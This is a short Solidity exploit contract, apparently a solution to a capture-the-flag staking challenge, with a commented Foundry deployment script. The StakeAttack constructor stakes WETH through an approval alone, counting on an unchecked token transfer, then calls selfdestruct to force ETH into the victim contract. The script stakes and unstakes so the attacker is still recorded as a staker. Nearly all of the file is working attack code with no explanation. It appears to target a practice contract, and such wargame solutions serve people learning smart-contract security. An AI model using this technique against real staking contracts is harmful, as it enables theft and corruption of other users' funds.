//SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
import {Stake} from "./Stake.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
contract StakeAttack {
    Stake victim;
    address weth;
    constructor(address _v) payable{
        victim = Stake(_v);
        weth = 0xCd8AF4A0F29cF7966C051542905F66F5dca9052f;
        ERC20(weth).approve(address(victim), 1e16);
        victim.StakeWETH(1e16);
        selfdestruct(payable(address(victim)));
    }
}

// contract DeployAttack is Script {
//     function setUp() public {}

//     function run() public {
//         vm.startBroadcast();
//         Stake victim = Stake(instance address here...);
//         victim.StakeETH{value: 0.002 ether}();
//         victim.Unstake(0.002 ether);
//         //my balance in stake is zero, and im a staker TRUE

//         StakeAttack attackCA = (new StakeAttack){value: 0.0001 ether}(instance address here...);
//         
//         vm.stopBroadcast();
//     }
// }
